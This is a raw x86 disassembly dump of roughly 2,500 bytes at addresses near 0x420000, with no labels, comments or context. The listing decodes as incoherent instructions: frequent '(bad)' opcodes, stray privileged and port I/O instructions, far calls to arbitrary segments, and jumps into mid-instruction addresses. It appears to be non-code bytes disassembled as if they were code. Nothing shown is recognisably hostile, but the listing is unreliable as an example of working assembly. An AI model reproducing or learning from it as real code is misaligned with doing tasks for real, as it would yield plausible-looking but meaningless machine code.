  41fc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc88:	jnp    0x41fce2
  41fc8a:	lds    ecx,FWORD PTR [edx+eiz*8]
  41fc8d:	pop    esi
  41fc8e:	fisubr DWORD PTR [edi-0x1f]
  41fc91:	xchg   esp,eax
  41fc92:	jns    0x41fc36
  41fc94:	jmp    0x41fc68
  41fc96:	fsubr  DWORD PTR [edi]
  41fc98:	fadd   QWORD PTR [ebx-0x48]
  41fc9b:	xor    eax,0x5788cf06
  41fca0:	mov    al,0x2a
  41fca2:	mov    ecx,0x6d59e935
  41fca7:	add    eax,0xf6ea8f11
  41fcac:	fcmovne st,st(6)
  41fcae:	add    ch,BYTE PTR [edx]
  41fcb0:	jl     0x41fcad
  41fcb2:	vmwrite edx,ebx
  41fcb5:	or     BYTE PTR [esi-0x6b],0xca
  41fcb9:	gs loopne 0x41fc79
  41fcbc:	xor    eax,DWORD PTR [edx-0x65]
  41fcbf:	xor    eax,0xd459ed1
  41fcc4:	adc    edi,edx
  41fcc6:	inc    ebx
  41fcc7:	and    ecx,edx
  41fcc9:	and    bh,ch
  41fccb:	or     al,0x41
  41fccd:	jecxz  0x41fce8
  41fccf:	mov    eax,ds:0x9f6eee0a
  41fcd4:	mov    dh,0xe0
  41fcd6:	inc    esi
  41fcd7:	push   cs
  41fcd8:	hlt    
  41fcd9:	lods   al,BYTE PTR ds:[esi]
  41fcda:	push   es
  41fcdb:	and    ebp,edi
  41fcdd:	dec    esi
  41fcde:	add    bh,BYTE PTR [esi-0x3db08ce0]
  41fce4:	lds    ecx,FWORD PTR [eax-0x632a66dc]
  41fcea:	jns    0x41fcfd
  41fcec:	add    eax,0x457cfbeb
  41fcf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf2:	repnz pop edi
  41fcf4:	sub    eax,0x6b5f0895
  41fcf9:	mov    bl,0x15
  41fcfb:	mov    ds:0xe9778946,al
  41fd00:	push   ecx
  41fd01:	in     eax,dx
  41fd02:	int    0x4b
  41fd04:	mov    al,0x4a
  41fd06:	dec    eax
  41fd07:	sbb    al,0x4f
  41fd09:	push   esp
  41fd0a:	outs   dx,BYTE PTR ds:[esi]
  41fd0b:	daa    
  41fd0c:	cwde   
  41fd0d:	push   cs
  41fd0e:	or     ebx,edx
  41fd10:	rol    DWORD PTR [eax],1
	...
  41fd72:	add    BYTE PTR [eax],al
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	add    eax,0x57a0ab54
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0x90000001
  41fd8d:	scas   al,BYTE PTR es:[edi]
  41fd8e:	daa    
  41fd8f:	rcl    BYTE PTR [ebp-0x10],1
  41fd92:	inc    edx
  41fd93:	out    0xc2,al
  41fd95:	cmc    
  41fd96:	imul   edx,DWORD PTR [esi-0x6ec94235],0xffffffaf
  41fd9d:	(bad)  
  41fd9f:	inc    ebx
  41fda0:	daa    
  41fda1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda3:	add    eax,DWORD PTR [edx+0x71]
  41fda6:	jecxz  0x41fd4f
  41fda8:	(bad)  
  41fda9:	std    
  41fdaa:	pop    eax
  41fdab:	dec    ecx
  41fdac:	xor    dh,bl
  41fdae:	xor    eax,0x87ad95ba
  41fdb3:	cdq    
  41fdb4:	jmp    0x717232c7
  41fdb9:	iret   
  41fdba:	sub    esi,esi
  41fdbc:	and    al,0xf2
  41fdbe:	jl     0x41fe27
  41fdc0:	mov    edi,0xe4617658
  41fdc5:	adc    al,BYTE PTR [eax+esi*8+0x5f5b36bd]
  41fdcc:	sbb    eax,0xdba288b0
  41fdd1:	push   0xffffffea
  41fdd3:	in     al,0x52
  41fdd5:	push   ecx
  41fdd6:	inc    ebx
  41fdd7:	sbb    ah,BYTE PTR [ebp+0x32]
  41fdda:	cmp    ch,BYTE PTR [eax+0x6d]
  41fddd:	xor    edx,ebp
  41fddf:	push   eax
  41fde0:	pop    esi
  41fde1:	in     al,dx
  41fde2:	mov    esi,0x812698a7
  41fde7:	cs push es
  41fde9:	sbb    DWORD PTR [edi+ecx*2+0x4de56223],0xffffffdf
  41fdf1:	daa    
  41fdf2:	xchg   edx,eax
  41fdf3:	sub    BYTE PTR [edx],ah
  41fdf5:	adc    esp,ecx
  41fdf7:	fs pop ebx
  41fdf9:	cmp    al,BYTE PTR [ebp-0x7]
  41fdfc:	add    esp,DWORD PTR [ecx]
  41fdfe:	sub    DWORD PTR [eax],edi
  41fe00:	xchg   DWORD PTR ds:0x3c9fd9b1,ebx
  41fe06:	xchg   DWORD PTR [ecx+0x2a36cd2d],esi
  41fe0c:	call   0xfcd4:0xe1c11f3b
  41fe13:	xchg   edi,eax
  41fe14:	jecxz  0x41fdf5
  41fe16:	addr16 sub al,0xa3
  41fe19:	xchg   esi,eax
  41fe1a:	adc    bl,bl
  41fe1c:	mov    ds:0x9a15cd82,eax
  41fe21:	test   ecx,ebx
  41fe23:	mov    eax,0xcfd95da7
  41fe28:	dec    edx
  41fe29:	and    eax,0x30be1179
  41fe2e:	inc    edi
  41fe2f:	lods   eax,DWORD PTR ds:[esi]
  41fe30:	or     ecx,DWORD PTR [esp+edi*8-0x59757174]
  41fe37:	ins    DWORD PTR es:[edi],dx
  41fe38:	scas   eax,DWORD PTR es:[edi]
  41fe39:	out    0x77,al
  41fe3b:	pusha  
  41fe3c:	scas   al,BYTE PTR es:[edi]
  41fe3d:	push   edi
  41fe3e:	mov    ds:0x5e2f6210,al
  41fe43:	sbb    BYTE PTR [eax-0x587cdc90],ch
  41fe49:	pop    es
  41fe4a:	adc    DWORD PTR [edi+0x40ad998e],eax
  41fe50:	ja     0x41fe1a
  41fe52:	(bad)  
  41fe53:	sar    DWORD PTR [edi],cl
  41fe55:	adc    esp,DWORD PTR [ecx]
  41fe57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe58:	lods   eax,DWORD PTR ds:[esi]
  41fe59:	sbb    eax,DWORD PTR [edx]
  41fe5b:	out    0x85,al
  41fe5d:	sbb    ebp,DWORD PTR [esi-0x1763d9d]
  41fe63:	(bad)  
  41fe64:	in     eax,dx
  41fe65:	rcr    BYTE PTR [eax],1
  41fe67:	push   ds
  41fe68:	lock inc ecx
  41fe6a:	aad    0x37
  41fe6c:	mov    WORD PTR [ebp+0x2f1840a6],?
  41fe72:	mov    bl,0x8d
  41fe74:	jle    0x41fe29
  41fe76:	stos   BYTE PTR es:[edi],al
  41fe77:	(bad)  
  41fe79:	ins    DWORD PTR es:[edi],dx
  41fe7a:	adc    edx,eax
  41fe7c:	rcr    DWORD PTR [ebx],1
  41fe7e:	fld    TBYTE PTR [ebx]
  41fe80:	cs (bad) 
  41fe82:	out    dx,eax
  41fe83:	arpl   WORD PTR [edi+0x37],bx
  41fe86:	test   BYTE PTR [eax+0x4b],ah
  41fe89:	aaa    
  41fe8a:	sub    DWORD PTR [esi+0x0],ecx
  41fe8d:	cs stos DWORD PTR es:[edi],eax
  41fe8f:	add    DWORD PTR [edx],ebx
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xa0
  41ff01:	loope  0x41ff5a
  41ff03:	call   0x105:0x1545c
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	xor    DWORD PTR [si+0x69c5],ebx
  41ff11:	and    bl,0xa
  41ff14:	(bad)  
  41ff15:	pop    edx
  41ff16:	test   BYTE PTR [esi-0x46a4e67f],bh
  41ff1c:	xor    eax,0xb190f132
  41ff21:	mov    eax,ds:0x47afb8d8
  41ff26:	xchg   edx,eax
  41ff27:	adc    eax,0x5f9dcba1
  41ff2c:	pop    edx
  41ff2d:	leave  
  41ff2e:	stos   BYTE PTR es:[edi],al
  41ff2f:	cmc    
  41ff30:	iret   
  41ff31:	mov    ah,0x93
  41ff33:	inc    esp
  41ff34:	inc    ecx
  41ff35:	mov    eax,ds:0xf5f64f20
  41ff3a:	push   ss
  41ff3b:	arpl   WORD PTR [esp+edi*8+0x1c],sp
  41ff3f:	jo     0x41ff46
  41ff41:	loopne 0x41fec5
  41ff43:	lock pop ss
  41ff45:	fld    QWORD PTR [esi+0x71]
  41ff48:	push   esi
  41ff49:	jecxz  0x41ff26
  41ff4b:	mov    ebp,0xcd20dc01
  41ff50:	sbb    BYTE PTR [ebx],ch
  41ff52:	loope  0x41ff1b
  41ff54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff55:	mov    ebp,0xc1f66e5
  41ff5a:	sbb    ch,BYTE PTR [esi+0x4ea0b87a]
  41ff60:	dec    edi
  41ff61:	and    al,0x8b
  41ff63:	shr    BYTE PTR [edi+0xad0c506],cl
  41ff69:	cwde   
  41ff6a:	push   0x122a9218
  41ff6f:	mov    esp,0x6a35679e
  41ff74:	nop
  41ff75:	outs   dx,BYTE PTR ds:[esi]
  41ff76:	mov    ch,0x9a
  41ff78:	test   DWORD PTR [esi],edx
  41ff7a:	mov    ebp,DWORD PTR [ebx+0x3d765d9c]
  41ff80:	cmp    eax,0x100917af
  41ff85:	into   
  41ff86:	inc    ebx
  41ff87:	(bad)  
  41ff88:	out    dx,al
  41ff89:	sbb    al,0x60
  41ff8b:	jb     0x41ffe9
  41ff8d:	push   es
  41ff8e:	dec    edi
  41ff8f:	pop    es
  41ff90:	and    al,0xd1
  41ff92:	dec    esp
  41ff94:	xchg   ebp,eax
  41ff95:	or     eax,DWORD PTR [eax+0x6e]
  41ff98:	mov    al,0xdb
  41ff9a:	or     BYTE PTR [edx-0x398bb105],al
  41ffa0:	arpl   WORD PTR [eax],bx
  41ffa2:	cli    
  41ffa3:	aas    
  41ffa4:	cdq    
  41ffa5:	js     0x41ff8d
  41ffa7:	mov    BYTE PTR [ebx-0x72],ah
  41ffaa:	cmc    
  41ffab:	adc    eax,0x27aa8a73
  41ffb0:	repz loope 0x41ff5d
  41ffb3:	cld    
  41ffb4:	jno    0x41ff3b
  41ffb6:	retf   
  41ffb7:	push   ds
  41ffb8:	mov    cl,0xa8
  41ffba:	jl     0x41fffd
  41ffbc:	gs popf 
  41ffbe:	loopne 0x41fffd
  41ffc0:	jge    0x41ffc5
  41ffc2:	push   edx
  41ffc3:	test   edx,0xd9d3c420
  41ffc9:	mov    edx,0x563645d1
  41ffce:	mov    es,eax
  41ffd0:	inc    ecx
  41ffd1:	sti    
  41ffd2:	push   ebx
  41ffd3:	add    al,0xac
  41ffd5:	xchg   ebp,eax
  41ffd6:	ins    DWORD PTR es:[edi],dx
  41ffd7:	mov    esp,DWORD PTR [ebx]
  41ffd9:	cmp    eax,0x77859fed
  41ffde:	lahf   
  41ffdf:	xlat   BYTE PTR ds:[ebx]
  41ffe0:	or     BYTE PTR [ecx],0xcf
  41ffe3:	cli    
  41ffe4:	ds cwde 
  41ffe6:	lea    esi,[ecx]
  41ffe8:	mov    esi,0x97cad57f
  41ffed:	dec    edi
  41ffee:	cmp    bl,BYTE PTR [ebx+0x181c690b]
  41fff4:	pop    ss
  41fff5:	mov    cl,0x4b
  41fff7:	(bad)  
  41fff9:	mov    ds:0xff5d129e,al
  41fffe:	imul   eax,DWORD PTR [eax+0x1d],0xffffffe2
  420002:	dec    eax
  420003:	imul   ebp,DWORD PTR [edi],0x99132e82
  420009:	jo     0x42004e
  42000b:	daa    
  42000c:	test   BYTE PTR [esi+ebp*8+0x4e08],bh
	...
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffb4
  420081:	enter  0xda5d,0x61
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x5f000001
  42008d:	neg    DWORD PTR [esi]
  42008f:	retf   0x21d8
  420092:	shl    BYTE PTR [edi+eax*4+0x6ebdad83],0xe1
  42009a:	xor    al,0x45
  42009c:	sub    al,0xb8
  42009e:	gs pop esi
  4200a0:	call   0x917e551c
  4200a5:	lock idiv bl
  4200a8:	(bad)  
  4200a9:	mov    esi,0xa2cd2ed5
  4200ae:	(bad)  [edi+0x4f]
  4200b1:	(bad)  
  4200b2:	jb     0x42007d
  4200b4:	pushf  
  4200b5:	stos   DWORD PTR es:[edi],eax
  4200b6:	out    dx,al
  4200b7:	jae    0x420081
  4200b9:	mov    dh,0x8c
  4200bb:	or     al,0xcd
  4200bd:	sar    DWORD PTR [ecx+0x22],1
  4200c0:	sahf   
  4200c1:	add    ebp,DWORD PTR [ecx]
  4200c3:	push   ecx
  4200c4:	(bad)  
  4200c6:	mov    dh,BYTE PTR [ebx-0x5f]
  4200c9:	mov    WORD PTR [ebx],fs
  4200cb:	mov    ecx,0x2f7557fe
  4200d0:	mov    ds,WORD PTR [ecx+esi*1]
  4200d3:	in     al,0xae
  4200d5:	cmp    BYTE PTR [edx],bl
  4200d7:	fs js  0x42007c
  4200da:	dec    eax
  4200db:	scas   al,BYTE PTR es:[edi]
  4200dc:	xor    edx,DWORD PTR [ebx+esi*1+0x37912a9a]
  4200e3:	in     al,dx
  4200e4:	push   ebx
  4200e5:	sub    al,0x9e
  4200e7:	push   ebx
  4200e8:	cdq    
  4200e9:	sbb    ebx,eax
  4200eb:	ret    
  4200ec:	mov    ebx,0xa1a7a9eb
  4200f1:	mov    ah,0xd2
  4200f3:	mov    al,0xde
  4200f5:	sub    al,BYTE PTR [ebx]
  4200f7:	jmp    0x4200c1
  4200f9:	push   ss
  4200fa:	and    BYTE PTR [ecx],ch
  4200fc:	inc    BYTE PTR [eax-0x4c2c919a]
  420102:	outs   dx,DWORD PTR ds:[esi]
  420103:	mov    ah,0xb4
  420105:	inc    esp
  420106:	loope  0x4200f4
  420108:	ins    BYTE PTR es:[edi],dx
  420109:	xchg   edi,eax
  42010a:	jecxz  0x4200a0
  42010c:	jecxz  0x420155
  42010e:	jl     0x420163
  420110:	pop    ebp
  420111:	mov    ebx,0xf034bde3
  420116:	mov    eax,0x34ea31e0
  42011b:	(bad)  
  42011c:	pop    edx
  42011d:	(bad)  
  42011e:	out    dx,al
  42011f:	cdq    
  420120:	mov    DWORD PTR [esi-0x5786a2b0],esi
  420126:	das    
  420127:	shr    DWORD PTR ds:0xdad650bc,0x8a
  42012e:	mov    edi,DWORD PTR [ebx]
  420130:	and    BYTE PTR [edi-0x2e94bac8],cl
  420136:	add    BYTE PTR [edx+0x6cc9be98],dl
  42013c:	pop    esp
  42013d:	inc    eax
  42013e:	int    0xeb
  420140:	mov    BYTE PTR ds:0x9364df95,ah
  420146:	xchg   ebx,eax
  420147:	cmp    ecx,eax
  420149:	enter  0xe4dc,0xe7
  42014d:	push   ebp
  42014e:	aam    0xc4
  420150:	dec    eax
  420151:	pop    esi
  420152:	repz mov edx,0x2485dc7
  420158:	cdq    
  420159:	push   cs
  42015a:	inc    esp
  42015b:	fld    QWORD PTR [ecx-0x1b]
  42015e:	lahf   
  42015f:	push   ss
  420160:	push   esi
  420161:	cwde   
  420162:	xchg   esi,eax
  420163:	int    0x7
  420165:	xchg   edi,eax
  420166:	cmc    
  420167:	push   ebp
  420168:	or     dl,dh
  42016a:	jns    0x42014d
  42016c:	sbb    al,0x71
  42016e:	in     eax,dx
  42016f:	cmc    
  420170:	jp     0x420108
  420172:	stos   BYTE PTR es:[edi],al
  420173:	and    ecx,esp
  420175:	push   es
  420176:	lods   eax,DWORD PTR ds:[esi]
  420177:	sub    BYTE PTR ds:0x1557b318,bh
  42017d:	push   cs
  42017e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42017f:	out    0x84,al
  420181:	and    al,0xc8
  420183:	push   esp
  420184:	scas   al,BYTE PTR es:[edi]
  420185:	lea    ebx,[ecx-0x70cde7e3]
  42018b:	pop    eax
  42018c:	test   al,0x4d
  42018e:	call   0x0:0xa65d
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x1e3dd5e1],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x86000001
  42020d:	loopne 0x420201
  42020f:	push   ebp
  420210:	xchg   ebx,eax
  420211:	pop    ecx
  420212:	mov    ebx,0x99ab494c
  420217:	(bad)  
  420218:	adc    cl,BYTE PTR [eax+ecx*1]
  42021b:	out    dx,eax
  42021c:	pop    DWORD PTR [edi]
  42021e:	sbb    al,0xa
  420220:	iret   
  420221:	or     BYTE PTR ds:0x3d1989b1,ch
  420227:	adc    BYTE PTR [esi],dh
  420229:	pop    ebp
  42022a:	imul   ebx,DWORD PTR [esi],0xffffff89
  42022d:	cmp    edx,esp
  42022f:	or     esi,DWORD PTR ds:0x13d27bbc
  420235:	cmp    DWORD PTR [ecx],edx
  420237:	clc    
  420238:	mov    dh,0xbe
  42023a:	inc    edx
  42023b:	cli    
  42023c:	icebp  
  42023d:	mov    ebx,cs
  42023f:	cdq    
  420240:	mov    esp,0xd8f530fb
  420245:	test   ecx,0xd49b2c66
  42024b:	adc    al,ch
  42024d:	enter  0xa294,0xcf
  420251:	ins    BYTE PTR es:[edi],dx
  420252:	fist   WORD PTR [eax+0x78a7ec7e]
  420258:	test   BYTE PTR [esp+esi*8-0x45],cl
  42025c:	mov    edi,0xe15ed189
  420261:	jo     0x420247
  420263:	jns    0x4202e0
  420265:	addr16 jae 0x4202b5
  420268:	(bad)  
  420269:	int    0xa
  42026b:	imul   edi,DWORD PTR [edx-0x7471952c],0xffffffae
  420272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420273:	push   ebx
  420274:	retf   
  420275:	pop    esi
  420276:	or     ch,BYTE PTR [eax]
  420278:	add    eax,0x37beb384
  42027d:	cli    
  42027e:	or     al,0xee
  420280:	mov    eax,DWORD PTR [edx]
  420282:	test   esi,0xd2ae7787
  420288:	jmp    0x420243
  42028a:	sbb    al,0x3c
  42028c:	mov    al,BYTE PTR ds:0xa480bee4
  420292:	dec    edi
  420293:	fstp   st(4)
  420295:	iret   
  420296:	push   eax
  420297:	and    eax,0x60ca05e8
  42029c:	ja     0x420308
  42029e:	mov    cl,BYTE PTR ds:0x28f0ad39
  4202a4:	xlat   BYTE PTR ds:[ebx]
  4202a5:	or     BYTE PTR [ebp+0x27],ch
  4202a8:	fisub  WORD PTR [edi+ecx*8-0x40]
  4202ac:	xor    esp,DWORD PTR ss:[ebx+0x5dbcc7c]
  4202b3:	xor    al,0xe6
  4202b5:	jo     0x42031a
  4202b7:	ja     0x420337
  4202b9:	jo     0x42026c
  4202bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202bc:	xlat   BYTE PTR ds:[ebx]
  4202bd:	jb     0x4202f1
  4202bf:	cld    
  4202c0:	inc    edi
  4202c1:	aaa    
  4202c2:	adc    bh,dh
  4202c4:	push   ecx
  4202c5:	out    0xfd,al
  4202c7:	xor    esp,esp
  4202c9:	jle    0x4202df
  4202cb:	aas    
  4202cc:	loopne 0x420324
  4202ce:	das    
  4202cf:	aad    0x1c
  4202d1:	mov    dl,0x14
  4202d3:	mov    ebx,0xb7f4a1d
  4202d8:	push   0x7cfd127d
  4202dd:	bound  esp,QWORD PTR [ecx]
  4202df:	inc    eax
  4202e0:	(bad)  
  4202e1:	fisub  DWORD PTR [ebx]
  4202e3:	mov    esp,0x71a606db
  4202e8:	out    dx,al
  4202e9:	pop    edx
  4202ea:	popf   
  4202eb:	or     BYTE PTR [edi-0x3b0fdac6],dl
  4202f1:	daa    
  4202f2:	push   cs
  4202f3:	(bad)  [ebx+0x4ab7f859]
  4202f9:	or     eax,DWORD PTR [ecx]
  4202fb:	scas   eax,DWORD PTR es:[edi]
  4202fc:	(bad)  [ecx+0x21e88b21]
  420302:	in     eax,dx
  420303:	div    BYTE PTR [ecx+0x7fe86670]
  420309:	shl    edi,cl
  42030b:	push   edi
  42030c:	ds js  0x4202f9
  42030f:	les    edi,FWORD PTR [esi+0x0]
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	stos   BYTE PTR es:[edi],al
  420381:	mov    ds:0x576b15bd,eax
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0x77000001
  42038d:	(bad)  
  42038e:	int3   
  42038f:	ds lahf 
  420391:	outs   dx,BYTE PTR ds:[esi]
  420392:	retf   
  420393:	test   BYTE PTR [eax],bl
  420395:	xchg   ebp,eax
  420396:	xchg   edi,eax
  420397:	and    ebx,DWORD PTR [edx-0x23479769]
  42039d:	mov    ebx,0x2e2893e6
  4203a2:	mov    ah,0xb7
  4203a4:	sbb    eax,0xfd5150a2
  4203a9:	ins    BYTE PTR es:[edi],dx
  4203aa:	pop    edi
  4203ab:	inc    edx
  4203ac:	mov    ebp,0x67fd43f2
  4203b1:	push   eax
  4203b2:	xchg   esi,eax
  4203b3:	repnz xor sp,WORD PTR ds:0x9d9b500f
  4203bb:	dec    edx
  4203bc:	sub    eax,0xc8fd72a8
  4203c1:	pop    ss
  4203c2:	mov    esi,0x4fab59f9
  4203c7:	fdiv   DWORD PTR [edi-0x510464b8]
  4203cd:	shl    DWORD PTR [ecx-0x6c2446ea],1
  4203d3:	or     al,0xce
  4203d5:	jmp    0x420435
  4203d7:	ja     0x420386
  4203d9:	mov    dh,0x92
  4203db:	out    0x2f,al
  4203dd:	ret    0x3a59
  4203e0:	leave  
  4203e1:	jle    0x42037f
  4203e3:	mov    ch,0x2b
  4203e5:	mov    ebx,DWORD PTR [edi]
  4203e7:	call   0x5283b5e9
  4203ec:	mov    al,BYTE PTR [edx+edx*2+0x4a0a3a3f]
  4203f3:	sub    BYTE PTR [esi+ebx*1-0x5b],ch
  4203f7:	adc    al,0xcc
  4203f9:	cmp    al,0x80
  4203fb:	les    eax,FWORD PTR [edi+0x17]
  4203fe:	mov    edx,0x6284a98c
  420403:	inc    esi
  420404:	add    DWORD PTR [esi+0x5e],ebp
  420407:	jp     0x420425
  420409:	retf   0x7534
  42040c:	sub    ecx,DWORD PTR [eax+0xdbe24bc]
  420412:	xlat   BYTE PTR ds:[ebx]
  420413:	pop    ecx
  420414:	cmp    eax,0x3442b867
  420419:	xor    al,0xa8
  42041b:	xor    dh,BYTE PTR [edx+0x38d5d454]
  420421:	mov    ebx,DWORD PTR [edx+0x7151f20f]
  420427:	mov    WORD PTR [esi],gs
  420429:	out    0xe5,eax
  42042b:	in     eax,dx
  42042c:	inc    ebx
  42042d:	inc    eax
  42042e:	adc    DWORD PTR [edx-0x3e],edx
  420431:	fs loop 0x420477
  420434:	ins    BYTE PTR es:[edi],dx
  420435:	mov    BYTE PTR [ecx+esi*4-0x2a],0xca
  42043a:	call   0x7e789358
  42043f:	jbe    0x420444
  420441:	test   DWORD PTR [esi+0x4e7dfbc3],esp
  420447:	push   cs
  420448:	in     eax,dx
  420449:	cdq    
  42044a:	scas   al,BYTE PTR es:[edi]
  42044b:	mov    ds,edx
  42044d:	loop   0x420412
  42044f:	mov    cl,0xcd
  420451:	in     al,0x6d
  420453:	jnp    0x420429
  420455:	push   esi
  420456:	outs   dx,DWORD PTR ds:[esi]
  420457:	das    
  420458:	js     0x4204c0
  42045a:	jmp    0x6c14:0x3c4735e5
  420461:	inc    esi
  420462:	in     eax,0xd9
  420464:	jmp    0x253:0x736711a8
  42046b:	inc    ebx
  42046c:	mov    ?,WORD PTR [ecx+0x56a88232]
  420472:	inc    edx
  420473:	xchg   edx,eax
  420474:	xchg   ebx,eax
  420475:	push   esi
  420476:	ja     0x4204d0
  420478:	sbb    bh,ch
  42047a:	arpl   WORD PTR [esi+0x70],sp
  42047d:	pop    ds
  42047e:	dec    ebp
  42047f:	sbb    BYTE PTR [ecx+0x5b4eb535],ch
  420485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420486:	in     eax,dx
  420487:	std    
  420488:	xor    BYTE PTR [ecx+0x4c],ch
  42048b:	and    al,0xa5
  42048d:	clc    
  42048e:	jb     0x420498
  420490:	imul   eax,DWORD PTR [eax],0x0
	...
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	jecxz  0x420563
  420502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420503:	xchg   ecx,eax
  420504:	jo     0x42055e
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0xa000001
  42050d:	adc    DWORD PTR [esi],esi
  42050f:	ret    
  420510:	les    edx,FWORD PTR [ecx+eiz*8+0x40]
  420514:	inc    edx
  420515:	repnz cld 
  420517:	in     al,dx
  420518:	xor    ebx,eax
  42051a:	fldenv [edx]
  42051c:	dec    ecx
  42051d:	daa    
  42051e:	(bad)  
  42051f:	int    0xc0
  420521:	ins    DWORD PTR es:[edi],dx
  420522:	outs   dx,DWORD PTR ds:[esi]
  420523:	jne    0x420530
  420525:	sbb    esi,DWORD PTR [edx+0x67a550d0]
  42052b:	mov    eax,0x51f16378
  420530:	bts    DWORD PTR [esi],edx
  420533:	jae    0x420505
  420535:	mov    dh,0xdd
  420537:	sbb    eax,ecx
  420539:	add    bh,cl
  42053b:	xor    esp,DWORD PTR [edi-0x1afc4acd]
  420541:	push   ss
  420542:	gs and ch,0xc5
  420546:	aad    0x96
  420548:	out    dx,al
  420549:	and    dh,BYTE PTR [edi+eiz*2-0x63808f31]
  420550:	sub    edx,DWORD PTR [ebx+0x1f]
  420553:	pusha  
  420554:	adc    al,0x6d
  420556:	outs   dx,BYTE PTR ds:[esi]
  420557:	in     eax,dx
  420558:	iret   
  420559:	or     al,0xe4
  42055b:	hlt    
  42055c:	in     al,0xcd
  42055e:	and    eax,0xf47e7a5b
  420563:	inc    edi
  420564:	or     al,0x94
  420566:	mov    ah,0x30
  420568:	je     0x4205c6
  42056a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42056b:	mov    DWORD PTR [ebx+edi*2+0x7d],ebx
  42056f:	outs   dx,DWORD PTR ds:[esi]
  420570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420571:	repnz stos DWORD PTR es:[edi],eax
  420573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420574:	xor    al,BYTE PTR [eax-0x6c]
  420577:	test   DWORD PTR [edx-0xe9a0ffe],edi
  42057d:	ret    0xdb75
  420580:	pop    es
  420581:	adc    BYTE PTR [ecx-0x6785610a],0x2f
  420588:	lea    ecx,[ebx+eax*1-0x16]
  42058c:	adc    al,dl
  42058e:	mov    dh,0x29
  420590:	ja     0x420518
  420592:	dec    edi
  420593:	call   0x82e57384
  420598:	mov    ch,al
  42059a:	mov    edx,0x4f968c9f
  42059f:	sub    BYTE PTR [ebx+0x3f0f7fff],ch
  4205a5:	popa   
  4205a6:	jns    0x42053f
  4205a8:	dec    ecx
  4205a9:	mov    edx,0x721ec046
  4205ae:	and    DWORD PTR [eax],eax
  4205b0:	jge    0x4205d5
  4205b2:	inc    esp
  4205b3:	retf   0xf628
  4205b6:	nop
  4205b7:	ins    DWORD PTR es:[edi],dx
  4205b8:	popa   
  4205b9:	ss push es
  4205bb:	push   ebx
  4205bc:	mov    dl,0xa1
  4205be:	push   cs
  4205bf:	fild   WORD PTR [eax+0x348c9374]
  4205c5:	inc    edx
  4205c6:	push   edi
  4205c7:	or     DWORD PTR [eax],eax
  4205c9:	repnz sbb eax,0xd7d3c4b5
  4205cf:	iret   
  4205d0:	pushf  
  4205d1:	rcr    BYTE PTR [edx-0x52],1
  4205d4:	sbb    al,0x20
  4205d6:	int    0x70
  4205d8:	cld    
  4205d9:	pop    DWORD PTR [edx]
  4205db:	gs cmp al,0x75
  4205de:	mov    dh,0xd7
  4205e0:	pop    ebp
  4205e1:	rcl    DWORD PTR [ecx+0x38],1
  4205e4:	sub    al,0xe4
  4205e6:	test   edx,ebx
  4205e8:	lds    esi,FWORD PTR [eax-0x24]
  4205eb:	(bad)  [bp+si-0xa]
  4205ef:	fsubrp st(1),st
  4205f1:	pushf  
  4205f2:	mov    DWORD PTR [edx-0x1463e117],esp
  4205f8:	aas    
  4205f9:	out    0xdf,eax
  4205fb:	adc    eax,0x7a7a83f8
  420600:	call   0xf9e437d9
  420605:	ss xchg edx,esp
  420608:	icebp  
  420609:	mov    DWORD PTR [edx+esi*2-0x17],ebx
  42060d:	rcr    DWORD PTR [edx+0x67b5],1
	...
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	xor    DWORD PTR [esi+ecx*1+0x15975da],0x0
  420688:	add    eax,0xef000001
  42068d:	(bad)  
  42068e:	and    al,0x6a
  420690:	sbb    cl,BYTE PTR [eax]
  420692:	lahf   
  420693:	fsubr  QWORD PTR [ebp+0x2d]
  420696:	mov    bx,WORD PTR [esi-0x50]
  42069a:	(bad)  
  42069b:	cs ret 0x3f00
  42069f:	mov    ebx,0x77cc6746
  4206a4:	mov    eax,0x2504ce0
  4206a9:	adc    BYTE PTR [edx],ch
